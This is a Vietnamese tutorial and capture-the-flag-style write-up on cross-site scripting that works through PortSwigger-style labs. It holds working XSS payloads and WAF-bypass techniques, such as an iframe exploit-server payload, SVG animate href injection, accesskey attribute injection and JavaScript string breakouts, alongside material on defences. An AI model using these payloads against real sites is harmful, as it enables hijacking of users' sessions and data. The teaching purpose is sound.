<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c90822f2-bc18-4341-8596-ea9aa4267f20" />Tìm hiểu Cross-site scripting (XSS)
A.	LÝ THUYẾT
1.	Khái niệm và mục đích:
-	Khái niệm: Cross-site scripting (XSS) là lỗ hổng bảo mật web cho phép kẻ tấn công chèn và thực thi mã độc (thường là JavaScript) vào trình duyệt của người dùng thông qua một ứng dụng web dễ bị tấn công.
2.	Mục đích: Khai thác XSS nhằm 
	Mạo danh hoặc giả dạng là người dùng là nạn nhân.
	Thực hiện bất kỳ hành động nào mà người dùng có thể thực hiện.
	Đọc bất kỳ dữ liệu nào mà người dùng có thể truy cập.
	Ghi lại thông tin đăng nhập của người dùng.
	Thực hiện phá hoại ảo trang web.
	Chèn chức năng trojan vào trang web.
3.	Phân loại XSS:
-	Reflected XSS: Trong đó tập lệnh độc hại xuất phát từ yêu cầu HTTP hiện tại.
-	Stored XSS: Trong đó tập lệnh độc hại xuất phát từ cơ sở dữ liệu của trang web.
-	DOM-based XSS: Trong đó lỗ hổng tồn tại ở mã phía máy khách chứ không phải mã phía máy chủ
4.	Cơ chế hoạt động:
Tấn công cross-site scripting hoạt động bằng cách thao túng một trang web dễ bị tấn công để trả về mã JavaScript độc hại cho người dùng. Khi mã độc được thực thi bên trong trình duyệt của nạn nhân, kẻ tấn công có thể xâm phạm hoàn toàn tương tác của họ với ứng dụng.
<img width="975" height="561" alt="image" src="https://github.com/user-attachments/assets/a2da79da-80bc-43d5-8353-83b0e7057fd2" />
5.	Hậu quả: 
Tác động thực tế của một cuộc tấn công XSS thường phụ thuộc vào bản chất của ứng dụng, chức năng và dữ liệu của ứng dụng, cũng như trạng thái của người dùng bị xâm phạm. Ví dụ:
	Trong ứng dụng brochureware, nơi tất cả người dùng đều ẩn danh và mọi thông tin đều được công khai, tác động thường sẽ rất nhỏ.
	Trong ứng dụng lưu trữ dữ liệu nhạy cảm, chẳng hạn như giao dịch ngân hàng, email hoặc hồ sơ chăm sóc sức khỏe, tác động thường sẽ rất nghiêm trọng.
	Nếu người dùng bị xâm phạm có quyền cao hơn trong ứng dụng, thì tác động thường rất nghiêm trọng, cho phép kẻ tấn công kiểm soát hoàn toàn ứng dụng dễ bị tấn công và xâm phạm tất cả người dùng và dữ liệu của họ.
6.	Cách tìm và kiểm tra lỗ hổng XSS: 
-	Kiểm tra thủ công Reflected XSS và Stored XSS thường gồm việc gửi chuỗi đầu vào đơn giản vào mọi điểm nhập, tìm nơi đầu vào xuất hiện trong phản hồi HTTP và thử khai thác để thực thi JavaScript.
-	Kiểm tra DOM-based XSS từ tham số URL cũng tương tự, nhưng dùng công cụ dev của trình duyệt để tìm đầu vào trong DOM. Với DOM XSS từ nguồn khác (như document.cookie hoặc hàm không liên quan HTML), cần xem xét mã JavaScript thủ công — việc này rất tốn thời gian. Burp Suite hỗ trợ phát hiện DOM XSS bằng phân tích tĩnh kết hợp động.
7.	Cách ngăn chặn các cuộc tấn công XSS:
-	Lọc dữ liệu đầu vào khi nhận được. Tại thời điểm nhận được dữ liệu đầu vào của người dùng, hãy lọc càng chặt chẽ càng tốt dựa trên dữ liệu đầu vào mong đợi hoặc hợp lệ.
-	Mã hóa dữ liệu khi xuất. Tại điểm dữ liệu người dùng có thể kiểm soát được xuất ra trong phản hồi HTTP, hãy mã hóa dữ liệu xuất để tránh bị diễn giải thành nội dung đang hoạt động. Tùy thuộc vào ngữ cảnh xuất, việc này có thể yêu cầu kết hợp mã hóa HTML, URL, JavaScript và CSS.
-	Sử dụng tiêu đề phản hồi phù hợp. Để ngăn chặn XSS trong các phản hồi HTTP không chứa bất kỳ HTML hoặc JavaScript nào, bạn có thể sử dụng tiêu đề Content-Typevà X-Content-Type-Optionsđể đảm bảo trình duyệt diễn giải các phản hồi theo cách bạn muốn.
-	Chính sách Bảo mật Nội dung. Là tuyến phòng thủ cuối cùng, bạn có thể sử dụng Chính sách Bảo mật Nội dung (CSP) để giảm mức độ nghiêm trọng của bất kỳ lỗ hổng XSS nào vẫn còn tồn tại.
B.	THỰC HÀNH
1.	Reflected XSS:
Reflected XSS là dạng tấn công cross-site scripting đơn giản nhất. Nó phát sinh khi một ứng dụng nhận dữ liệu trong một yêu cầu HTTP và đưa dữ liệu đó vào phản hồi tức thời theo cách không an toàn.
Sau đây là một ví dụ đơn giản về lỗ hổng XSS phản ánh:https://insecure-website.com/status?message=All+is+well.<p>Status: All is well.</p>
Ứng dụng không thực hiện bất kỳ xử lý dữ liệu nào khác, do đó kẻ tấn công có thể dễ dàng thực hiện một cuộc tấn công như thế này:
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
<p>Status: <script>/* Bad stuff here... */</script></p>
Nếu người dùng truy cập URL do kẻ tấn công tạo ra, tập lệnh của kẻ tấn công sẽ được thực thi trên trình duyệt của người dùng, trong bối cảnh phiên làm việc của người dùng với ứng dụng. Tại thời điểm đó, tập lệnh có thể thực hiện bất kỳ hành động nào và truy xuất bất kỳ dữ liệu nào mà người dùng có quyền truy cập.
Có nhiều loại tấn công Reflected XSS khác nhau. Vị trí của Reflected XSS trong phản hồi của ứng dụng quyết định loại dữ liệu cần thiết để khai thác nó và cũng có thể ảnh hưởng đến tác động của lỗ hổng.
1.1	XSS giữa các thẻ HTML
1.1.1 Reflected XSS vào HTML mà không được mã hóa:
-	Reflected XSS xảy ra khi dữ liệu người dùng nhập vào (trong URL, form, v.v.) được phản hồi lại trang HTML mà không qua bước mã hóa hoặc lọc.
-	"HTML context with nothing encoded" nghĩa là dữ liệu được đưa thẳng vào HTML mà không escape các ký tự đặc biệt (<, >, ", '...), nên attacker có thể chèn trực tiếp thẻ <script> hoặc HTML độc hại.
Bước 1: Gõ từ khóa "myiterm" vào thanh tìm kiếm → server trả về kết quả hiển thị "0 search results for 'myiterm'".
Bước 2: Trong HTML response, giá trị myiterm được chèn thẳng vào bên trong thẻ <h1> và một số phần khác mà không mã hóa.
<img width="975" height="515" alt="image" src="https://github.com/user-attachments/assets/9a44666e-8b06-4dc5-9661-b586226dfdd6" />
<img width="975" height="548" alt="image" src="https://github.com/user-attachments/assets/5e2ec2e2-50e8-4854-a5b7-9c2bda2c6295" />
Dữ liệu nhập (myiterm) nằm trực tiếp trong nội dung HTML → có khả năng chèn script.
Bước 3: Thử payload XSS:
Thay myiterm bằng <script>alert(1)</script> 
Server trả về payload nguyên vẹn trong HTML không hề encode → trình duyệt khi render sẽ chạy <script>alert(1)</script>.
<img width="975" height="548" alt="image" src="https://github.com/user-attachments/assets/3ef7c7c9-6a4d-4c9f-80d1-d3bf1ba9cd7c" />
Một popup alert(1) xuất hiện → chứng minh XSS thành công.
<img width="975" height="548" alt="image" src="https://github.com/user-attachments/assets/8cb3f2bd-db42-460d-a73c-87b614cb8bac" />
<img width="975" height="548" alt="image" src="https://github.com/user-attachments/assets/c5502edc-e145-49b8-832d-43d1fc9ce766" />
1.1.2 Reflected XSS vào HTML với hầu hết các thẻ và thuộc tính bị chặn
- Lab này chứa lỗ hổng XSS phản ánh trong chức năng tìm kiếm nhưng sử dụng tường lửa ứng dụng web (WAF) để bảo vệ chống lại các vectơ XSS phổ biến.
- Để giải quyết bài toán này, hãy thực hiện một cuộc tấn công  bỏ qua WAF và gọi print().
  Bước 1: Thử chèn XSS bằng thẻ <img> với thuộc tính onerror để thực thi JavaScript.
  <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a5dfbe16-5ec5-4a4c-b11b-047256ba284c" />
  Server chặn thẻ/thuộc tính nguy hiểm và trả về "Tag is not allowed", nên payload không chạy được
  <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e4650a5a-3bb7-4365-836b-a27f74ffaf75" />
  Bước 2: Mở trình duyệt của Burp và sử dụng chức năng tìm kiếm trong phòng thí nghiệm. Gửi yêu cầu kết quả đến Burp Intruder.Thay thế giá trị của từ khóa tìm kiếm bằng:<§§>
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2412ec63-086b-4b9f-b604-cfc07a806dd8" />
Bước 3: Truy cập bảng hướng dẫn XSS và nhấp vào Sao chép thẻ vào bảng tạm .
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/bba03bd0-23bd-41d0-b1a1-7f5a774d0efc" />
Nhấp vào Bắt đầu tấn công
  <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b9fe4730-5800-429b-b71c-09596fc020ae" />
Đây là kết quả chạy Burp Intruder để fuzz các thẻ HTML xem thẻ nào được phép trên trang 
      + 400 kèm độ dài 113 → thẻ bị filter, server từ chối (“Tag is not allowed”).
      + 200 với độ dài lớn hơn (3476, 3480, 3487) → thẻ được phép và phản chiếu lại.
Bước 4: Quay lại Burp Intruder. Giá trị của thuật ngữ tìm kiếm bây giờ sẽ trông như sau:<body%20§§=1>
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/01d2b1fe-3589-4266-8530-99803d9d80ab" />
Bước 5:  Truy cập bảng hướng dẫn XSS và nhấp vào Sao chép sự kiện vào bảng tạm . Nhấn bắt đầu tấn công
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d918a79b-f627-4c42-8a34-be9ea819de9b" />
Đây là kết quả fuzz các sự kiện (event handler) trong Burp Intruder để xem sự kiện nào không bị filter
Bước 6: Truy cập máy chủ khai thác và dán đoạn mã sau: <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/530367f1-55ee-4375-bed4-db42fb451f08" />
Bước 7: Nhấp vào Lưu trữ và Gửi mã độc đến nạn nhân 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/56592649-0d9d-4534-94ce-611c0689bd0d" />
Kết quả: bypass filter bằng cách lợi dụng thẻ <body> (không bị chặn) và sự kiện onresize (cho phép), nhúng vào exploit server → khiến victim tự động kích hoạt payload → lab được solve.
1.1.3 Reflected XSS vào HTML với tất cả các thẻ bị chặn ngoại trừ các thẻ tùy chỉnh
Lab này chặn tất cả các thẻ HTML ngoại trừ các thẻ tùy chỉnh. Bằng cách thực hiện một cuộc tấn công chèn một thẻ tùy chỉnh và tự động cảnh báo document.cookie.
Bước 1: Truy cập máy chủ khai thác và dán đoạn mã sau: 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/24ebba63-ee2f-4a6d-99fb-f2b61c1c7cc3" />
Việc tiêm này tạo một thẻ tùy chỉnh với ID x, chứa trình xử lý sự kiện onfocus kích hoạt alert. Hash ở cuối URL sẽ tập trung vào phần tử này ngay khi trang được tải, khiến payload được gọi.
Bước 2: Nhấp vào "Lưu trữ" và "Gửi mã khai thác cho nạn nhân".
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/675f295c-9c06-4af8-961c-958e68b1a58c" />
1.1.4 Reflected XSS với trình xử lý sự kiện và thuộc tính href bị chặn
Lab này chứa lỗ hổng XSS phản ánh với một số thẻ được phép, nhưng tất cả các sự kiện và href đều bị chặn. Thực hiện một cuộc tấn công bằng cách chèn một vectơ, khi được nhấp vào, sẽ gọi alert đó.
Lưu ý cần gắn nhãn vector của mình bằng từ "Click" để khuyến khích người dùng nhấp vào vector của bạn
Bước 1: Truy cập URL sao: 
https://0a1400ca04d85c84801ea8ed00ff0023.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/58a3a92e-67cb-42a7-ab34-7dd00092fdc4" />
Giải thích:
- Vì không thể gán trực tiếp href="javascript:...", ta dùng cơ chế SMIL animation trong SVG để thay đổi động thuộc tính href sau khi DOM load.
      + Dùng <animate attributeName=href values=javascript:alert(1) /> bên trong thẻ <a>.
      + Điều này khiến thuộc tính href của <a> được tự động gán thành javascript:alert(1).
- Sau đó, ta thêm <text> để hiển thị chữ “Click me” nhằm khuyến khích người dùng click.
Kết quả: 
- Khi trang phản xạ lại input này, SVG được parse.
- Animation gán href động cho <a>.
- Người dùng click vào dòng chữ “Click me” → javascript:alert(1) chạy → XSS thành công.
1.1.5 Reflected XSS với một số đánh dấu SVG được cho phép
Trang web đang chặn các thẻ phổ biến nhưng lại bỏ sót một số thẻ và sự kiện SVG.
Bước 1,2,3 làm giống mục 1.1.2 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/6c74e242-f288-4d0a-a1ff-8d5af8cd187e" />
Khi cuộc tấn công kết thúc. Quan sát thấy tất cả các payload đều tạo ra phản hồi 400 , ngoại trừ những payload sử dụng thẻ <svg>, <animatetransform>, <title>, và <image>đã nhận được phản hồi 200.
Bước 4: Quay lại tab Intruder, thêm thuật ngữ tìm kiếm: <svg><animatetransform%20§§=1>. Truy cập bảng hướng dẫn XSS và nhấp vào Sao chép sự kiện vào bảng tạm .
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1230e39d-9c42-4252-84f0-7b934444ccc5" />
Bước 5: Nhấp vào bắt đầu tấn công
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ce9d93c1-3322-4de9-8e05-f350d838e633" />
Khi cuộc tấn công kết thúc tất cả các tải trọng đều gây ra phản hồi 400, ngoại trừ onbegin tải trọng gây ra phản hồi 200.
Bước 6: Nhập <svg><animateTransform onbegin=alert(1)'> vào ô Search
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/05f745a4-e976-48b5-8579-39e2a4d2f690" />
1.2	XSS trong thuộc tính thẻ HTML
1.2.1 Reflected XSS vào thuộc tính có dấu ngoặc nhọn được mã hóa HTML:
-	Đây là dạng Reflected XSS nhưng dữ liệu đầu vào được đưa vào giá trị của một thuộc tính HTML (ví dụ: value="", title="", onmouseover=""…).
-	Dấu ngoặc nhọn < > bị HTML encode → tức là nếu gửi <script>alert(1)</script> thì trang web sẽ hiển thị dưới dạng &lt;script&gt;... → không thực thi được.
-	Tuy nhiên, phần thuộc tính HTML lại chưa được lọc các ký tự đặc biệt như dấu nháy ", ' hoặc tên sự kiện (event handler) → vẫn có thể chèn JavaScript.
-	Bước 1: Gửi một chuỗi ký tự chữ và số ngẫu nhiên vào hộp tìm kiếm. Giá trị 1234 đang nằm bên trong thuộc tính value của thẻ <input>.
-	<img width="975" height="548" alt="image" src="https://github.com/user-attachments/assets/df69a2d9-bb7e-4167-a8eb-cadd8c029e90" />
-	Bước 2: Thay thế đầu vào bằng "onmouseover="alert(1). Trên URL mã hóa thành: ?search="onmouseover%3Dalert(1). Trên render, nó trở thành:
<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover=alert(1)>
<img width="802" height="451" alt="image" src="https://github.com/user-attachments/assets/673e4e6b-8482-4ab9-87e2-6a930d8caabd" />
Trình duyệt hiểu đây là một thẻ <input> có thuộc tính sự kiện onmouseover gán với alert(1). Khi người dùng di chuột vào, JavaScript alert(1)  chạy → popup xuất hiện.
<img width="813" height="457" alt="image" src="https://github.com/user-attachments/assets/2d3bde8b-8b91-426a-b0ea-5cfa0c8cc89f" />
1.2.2 Reflected XSS trong thẻ liên kết chuẩn
Lab này phản ánh thông tin đầu vào của người dùng trong thẻ liên kết chuẩn và thoát khỏi dấu ngoặc nhọn. Thực hiện một cuộc tấn công mã lệnh chéo trang trên trang chủ để chèn một thuộc tính gọi alert.
Giả định rằng người dùng được mô phỏng sẽ nhấn các tổ hợp phím sau:
      + ALT+SHIFT+X
      + CTRL+ALT+X
      + Alt+X
Bước 1: Truy cập URL sau: https://0a0b0017037ae73d813e67ba00e900ce.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1) -> Nhấn: ALT+SHIFT+X
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1793e735-a3a3-42ee-8f27-df526cfcc622" />
- Thao tác này sẽ đặt X làm khóa truy cập cho toàn bộ trang. Khi người dùng nhấn phím truy cập, alert sẽ được gọi.
- Do input được phản ánh vào một thẻ HTML hợp lệ và escape dấu < >, ta chỉ có thể tiêm thuộc tính thay vì mở thẻ mới.
- Payload tận dụng accesskey + onclick để ép trình duyệt chạy JavaScript khi nạn nhân nhấn tổ hợp phím.
1.3 XSS vào JavaScript: 
1.3.1 Reflected XSS vào chuỗi JavaScript với dấu nháy đơn và dấu gạch chéo ngược được thoát
Lab chứa một lỗ hổng mã hóa chéo trang phản ánh trong chức năng theo dõi truy vấn tìm kiếm. Việc phản ánh xảy ra bên trong một chuỗi JavaScript với dấu ngoặc đơn và dấu gạch chéo ngược được thoát. Thực hiện một cuộc tấn công mã lệnh chéo trang web để thoát khỏi chuỗi JavaScript và gọi alert.
Bước 1:Tìm kiếm mytien1234, sau đó sử dụng Burp Suite để chặn yêu cầu tìm kiếm và gửi đến Burp Repeater. mytien1234 đã được phản ánh bên trong chuỗi JavaScript. 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d7cafb51-d4e6-44f1-bed2-1cf4cb5b366a" />
Bước 2: thay mytien1234 bằng mytien1234'payload và quan sát dấu nháy đơn được thoát bằng dấu gạch chéo ngược, ngăn thoát khỏi chuỗi.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9aa199f2-b5e6-4a02-881e-b4ec2894364a" />
Bước 3: Thay thế đầu vào bằng </script><script>alert(1)</script>  để thoát khỏi khối tập lệnh và chèn một tập lệnh mới
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/86ea6986-eb08-435a-b048-b00868e562bd" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e6f61fee-3e2c-48d7-bca7-c73a28d1e355" />
1.3.2 Reflected XSS vào chuỗi JavaScript có dấu ngoặc nhọn được mã hóa HTML
- Bối cảnh (Context): Payload người dùng nhập vào được chèn vào bên trong chuỗi JavaScript (string) trong HTML.
- Dấu ngoặc nhọn < > đã được mã hóa HTML → nghĩa là nếu chèn trực tiếp thẻ <script> sẽ bị vô hiệu (< → &lt;, > → &gt;).
- Tuy nhiên, ta vẫn có thể thoát ra khỏi chuỗi JavaScript bằng cách đóng chuỗi (dùng dấu ' hoặc ") và thêm mã JavaScript độc hại. 
Bước 1: Gửi một chuỗi ký tự chữ và số ngẫu nhiên vào hộp tìm kiếm. chuỗi ngẫu nhiên đã được phản ánh bên trong chuỗi JavaScript
<img width="975" height="548" alt="image" src="https://github.com/user-attachments/assets/6aa4abf4-c7f2-4489-bcda-7cc81ea7003d" />
Bước 2: Thay thế đầu vào bằng '-alert(1)-' để thoát khỏi chuỗi JavaScript
<img width="975" height="548" alt="image" src="https://github.com/user-attachments/assets/f66a9167-f7f2-4e80-bfc8-2c7bb576c9f1" />
<img width="975" height="548" alt="image" src="https://github.com/user-attachments/assets/c35ba8bd-0a7e-434c-8622-4ba869522cc0" />
1.3.3 Reflected XSS vào chuỗi JavaScript với dấu ngoặc nhọn và dấu ngoặc kép Mã hóa HTML và thoát dấu ngoặc đơn
Lab chứa lỗ hổng thực thi mã lệnh chéo trang trong chức năng theo dõi truy vấn tìm kiếm, trong đó dấu ngoặc nhọn và dấu ngoặc kép được mã hóa HTML và dấu ngoặc đơn được thoát. Thực hiện một cuộc tấn công để thoát khỏi chuỗi JavaScript và gọi alert.
Bước 1:Tìm kiếm mytien1234, sau đó sử dụng Burp Suite để chặn yêu cầu tìm kiếm và gửi đến Burp Repeater. mytien1234 đã được phản ánh bên trong chuỗi JavaScript.
Bước 2: Thay mytien1234 bằng mytien1234'payload và quan sát dấu nháy đơn được thoát bằng dấu gạch chéo ngược, ngăn thoát khỏi chuỗi.
Bước 4: Thay bằng mytien1234\payload và quan sát dấu gạch chéo ngược không bị thoát.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b58f91ad-f26e-4299-b381-36d0dd1d6a08" />
Bước 5: Nhập \'-alert(1)// vào ô tìm kiếm để đưa ra cảnh báo 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4e8536fb-e755-4832-bdb4-ae4652c11ff9" />
1.3.4 Reflected XSS trong URL 
Lab này phản ánh dữ liệu đầu vào trong một URL JavaScript cho thấy ứng dụng đang chặn một số ký tự nhằm ngăn chặn các cuộc tấn công XSS.Thực hiện một cuộc tấn công để gọi alert có chuỗi ký tự 1337 nằm ở đâu đó trong alert.
Bước 1: Truy cập URL sau: 
https://0aca00ba03c8b93c80b0626800e300ff.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/fbc7d97f-6589-41e5-a6a7-4d2395e61c13" />
- Lỗ hổng này sử dụng xử lý ngoại lệ để gọi alert với các đối số. throw được sử dụng, phân tách bằng chú thích trống để tránh hạn chế không có khoảng trắng. alert được gán cho trình xử lý ngoại lệ onerror
- Vì throw là một câu lệnh, nó không thể được sử dụng như một biểu thức. Thay vào đó, chúng ta cần sử dụng các hàm mũi tên để tạo một khối lệnh để throw có thể sử dụng câu lệnh. Sau đó, chúng ta cần gọi hàm này, gán nó cho thuộc toString của window và kích hoạt this bằng cách buộc chuyển đổi chuỗi trên window.
Kết quả: 
| Thành phần                           | Mục đích                                                                                                   |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------- |
| `'},`                                | Thoát khỏi chuỗi `'...'`, kết thúc đoạn hiện tại bằng `},` để đóng object/lệnh JavaScript đang được sử dụng. |
| `x=x=>{throw/**/onerror=alert,1337}` | Tạo function kích hoạt `alert`.                                                                            |
| `toString=x`                         | Ghi đè `.toString()`. Nếu biến nào bị ép thành chuỗi (qua `+` chẳng hạn), nó sẽ kích hoạt hàm `x()` → và từ đó `throw onerror=alert`. |
| `window+''`                          | Ép `window` thành chuỗi → kích hoạt `.toString()` → gọi `x()` → chạy `alert(1337)`.                        |
| `{x:'`                               | Làm hợp lệ phần còn lại của JavaScript để tránh lỗi cú pháp.                                               |
1.3.5 Reflected XSS vào mẫu theo angle brackets, dấu ngoặc nhọn, dấu ngoặc đơn, dấu ngoặc kép, dấu gạch chéo ngược và dấu ngoặc kép Unicode thoát
Lỗ hổng này xảy ra bên trong một chuỗi mẫu với dấu ngoặc nhọn, dấu ngoặc đơn và dấu ngoặc kép được mã hóa HTML, và dấu ngoặc kép ngược được thoát. Để giải quyết bài thực hành này, hãy thực hiện một cuộc tấn công mã hóa chéo trang web bằng cách gọi alert bên trong chuỗi mẫu.
Bước 1: Nhập mytien1234 vào ô tìm kiếm sau đó sử dụng Burp Suite để chặn yêu cầu tìm kiếm và gửi đến Burp Repeater. Lưu ý rằng chuỗi ngẫu nhiên đã được phản ánh bên trong chuỗi mẫu JavaScript
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c6684120-29b7-4b3a-b093-4444e5d11cd8" />
Bước 2: Nhập ${alert(1)} vào ô tìm kiếm
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/395f0733-7811-4750-bc8a-d4eaafda0072" />
1.4 Cách tìm và kiểm tra lỗ hổng Reflected XSS: 
- Xem xét tất cả dữ liệu đầu vào: tham số URL, nội dung yêu cầu, đường dẫn, tiêu đề HTTP...
- Gửi giá trị ngẫu nhiên: 
      + Gửi một chuỗi số ngẫu nhiên (~8 ký tự) để kiểm tra xem dữ liệu có được phản chiếu trong phản hồi không.
      + Dùng Burp Intruder để tự động tạo và đánh dấu phản hồi chứa giá trị đã gửi.
- Xác định ngữ cảnh phản chiếu: Xem giá trị được phản chiếu trong HTML, thuộc tính thẻ, JavaScript… để biết cách chèn payload.
- Kiểm tra tải trọng payload
      + Dựa vào ngữ cảnh, chèn payload XSS thử nghiệm (qua Burp Repeater).
      + Kết hợp với giá trị ngẫu nhiên để dễ xác định vị trí phản chiếu trong phản hồi.
- Thử các payload thay thế: Nếu payload bị chặn/sửa đổi → thử các kỹ thuật khác phù hợp với ngữ cảnh và cơ chế lọc.
- Xác minh trong trình duyệt: Kiểm tra trực tiếp bằng trình duyệt để xem JavaScript có thực thi hay không (thường dùng alert(document.domain)).
2. Stored XSS
- Khái niệm: Stored XSS (còn gọi là XSS bậc hai hoặc XSS dai dẳng) xảy ra khi dữ liệu do người dùng nhập (từ nguồn không đáng tin cậy) được ứng dụng lưu trữ lại (ví dụ trong cơ sở dữ liệu) và hiển thị cho người dùng khác mà không qua kiểm tra/thoát (sanitize/escape) an toàn.
- Cách thức: 
      + Kẻ tấn công gửi dữ liệu chứa mã độc (ví dụ: thẻ <script>) vào ứng dụng.
      + Ứng dụng lưu trữ dữ liệu này (ví dụ: trong bình luận blog).
      + Khi người dùng khác truy cập trang, dữ liệu độc hại được chèn vào phản hồi HTML.
      + Trình duyệt nạn nhân thực thi đoạn script đó trong bối cảnh phiên làm việc của họ.
- Điểm khác biệt chính: Stored XSS nguy hiểm hơn Reflected XSS vì mã độc được lưu trữ lâu dài và tự động ảnh hưởng đến nhiều nạn nhân truy cập ứng dụng.
2.1 XSS giữa các thẻ HTML
2.1.1 Stored XSS vào HTML mà không được mã hóa
Lab chứa lỗ hổng mã hóa chéo trang được lưu trữ trong chức năng bình luận. Để giải quyết bài thực hành này, hãy gửi bình luận gọi alert khi bài đăng trên blog được xem.
Bước 1: Nhập <script>alert(1)</script> vào bình luận, nhập tên, email và trang web
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/16fd9878-9eea-4297-9e84-b0731b2535dd" />
Bước 2: Nhấn Quay lại Blog
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c5524307-e847-4563-86a7-bdcb15f1d6da" />
Kết quả: 
Payload <script>alert(1)</script> được nhập trong form bình luận đã không bị mã hóa hay lọc lại, và được lưu vào cơ sở dữ liệu. Khi truy cập lại bài viết, phần bình luận được render thẳng vào HTML dưới dạng: <script>alert(1)</script>
2.2 XSS trong thuộc tính thẻ HTML
2.2.1 Stored XSS vào thuộc tính href với dấu ngoặc kép được mã hóa HTML
Bài Lab này chứa một lỗ hổng mã hóa chéo trang được lưu trữ trong chức năng bình luận. Để giải quyết bài thực hành này, hãy gửi một bình luận có alert khi nhấp vào tên tác giả bình luận.
2.3 XSS vào JavaScript
2.3.1 Stored XSS vào onclicksự kiện với dấu ngoặc nhọn và dấu ngoặc kép Mã hóa HTML và dấu ngoặc đơn và dấu gạch chéo ngược được bỏ qua
Lab này chứa lỗ hổng mã hóa chéo trang được lưu trữ trong chức năng bình luận. Để giải quyết bài tập này, hãy gửi bình luận gọi alert khi nhấp vào tên tác giả bình luận.
3. DOM-based XSS
3.1 Khái niệm DOM-based XSS:
- DOM-Based XSS xảy ra khi JavaScript lấy dữ liệu từ nguồn không tin cậy (ví dụ: URL, window.location) và đưa trực tiếp vào sink (chẳng hạn như innerHTML, eval()), dẫn đến việc thực thi mã độc hại.
- Kẻ tấn công chỉ cần chèn payload vào URL (query string, fragment, path…) rồi dụ nạn nhân truy cập, khi đó đoạn mã sẽ được thực thi trong trình duyệt của nạn nhân.
3.2 Cách kiểm tra DOM-based XSS
- Tự động: Burp Suite có thể nhanh chóng phát hiện phần lớn lỗ hổng DOM XSS.
- Thủ công: Dùng trình duyệt có công cụ DevTools (Chrome, Firefox...) để phân tích từng nguồn dữ liệu.
- Kiểm tra HTML sink:
      + Chèn chuỗi ngẫu nhiên vào nguồn (như location.search).
      + Tìm chuỗi trong DOM bằng DevTools (không dùng “View Source”).
      + Xác định ngữ cảnh xuất hiện và thử biến đổi dữ liệu đầu vào (thêm dấu ngoặc, ký tự đặc biệt...) để xem có thoát khỏi ngữ cảnh được không.
      + Lưu ý: các trình duyệt xử lý mã hóa URL khác nhau (Chrome/Firefox/Safari mã hóa, IE/Edge cũ thì không).
- Kiểm tra JavaScript sink:
      + Khó hơn vì dữ liệu không hiện trực tiếp trong DOM.
      + Dùng DevTools → tìm nguồn (location, document, …) trong mã JS (Ctrl+Shift+F).
      + Đặt breakpoint, theo dõi dữ liệu đi qua các biến, hàm.
      + Khi thấy dữ liệu đến một sink, kiểm tra giá trị và thử điều chỉnh input để khai thác XSS.
- Dùng DOM Invader (Burp Suite): Hỗ trợ tự động phát hiện & khai thác DOM XSS, giảm công sức phải phân tích thủ công mã JavaScript phức tạp.
3.3 Khai thác DOM XSS với các sources và sinks khác nhau
3.3.1 DOM XSS trong document.write sử dụng nguồn location.search
Lab này chứa lỗ hổng mã hóa chéo trang dựa trên DOM trong chức năng theo dõi truy vấn tìm kiếm. Nó sử dụng document.write để ghi dữ liệu ra. Hàm này được gọi với dữ liệu từ location.search, mà bạn có thể kiểm soát bằng cách sử dụng URL của trang web.
Bước 1: Nhập mytien1234 vào hộp tìm kiếm. Nhấp chuột phải và kiểm tra phần tử, sau đó quan sát thấy mytien1234 được đặt bên trong một img src.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f1506ca4-45b2-4b6e-9cc6-7ef028a35c66" />
Bước 2: Thoát khỏi img bằng cách tìm kiếm: "><svg onload=alert(1)>
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ffab3297-d7b5-4259-a4df-077e74127554" />
- Hàm document.write(location.search) ghi trực tiếp giá trị từ URL lên trang.
- Không có escaping/encoding/validation.
3.3.2 DOM XSS trong document.write sử dụng source location.search bên trong phần tử select
